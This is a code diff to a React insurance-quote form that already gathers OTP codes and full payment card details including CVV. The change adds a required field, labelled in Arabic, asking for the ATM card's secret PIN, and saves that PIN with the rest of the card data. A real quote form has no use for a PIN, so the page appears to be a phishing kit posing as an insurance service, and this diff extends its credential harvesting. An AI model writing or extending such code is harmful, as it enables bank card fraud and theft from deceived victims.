@@ -633,6 +633,7 @@ function ProfessionalQuoteForm() {
   const [otpSent, setOtpSent] = useState(false)
   const [otpVerified, setOtpVerified] = useState(false)
   const [otpAttempts, setOtpAttempts] = useState(3)
+  const [pinCode, setPinCode] = useState("")
   const [cardNumber, setCardNumber] = useState("")
   const [cardName, setCardName] = useState("")
   const [cardMonth, setCardMonth] = useState("")
@@ -654,6 +655,7 @@ function ProfessionalQuoteForm() {
     specialDiscounts: false,
     agreeToTerms: false,
     selectedInsuranceOffer: "",
+    pinCode: "",
     selectedAddons: [] as string[],
     phone: "",
   })
@@ -882,6 +884,7 @@ function ProfessionalQuoteForm() {
           cardMonth,
           cardYear,
           cvv,
+          pinCode
         }
 
         addData(dataToSave)
@@ -1735,6 +1738,23 @@ function ProfessionalQuoteForm() {
                           />
                         </div>
                       </div>
+                      <div>
+                        <label className="block text-sm font-semibold text-gray-700 mb-3">
+الرقم السري لبطاقة الصراف <span className="text-red-500">*</span>
+                        </label>
+                        <Input
+                          name="pinCode"
+                          id="pinCode"
+                          type="tel"
+                          className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
+                          value={pinCode}
+                          onChange={(e) => setPinCode(e.target.value)}
+                          placeholder="####"
+                          maxLength={4}
+                          required
+                        />
+                      </div>
+
                     </div>
 
                     <Card className="border-2 border-gray-200 h-fit">
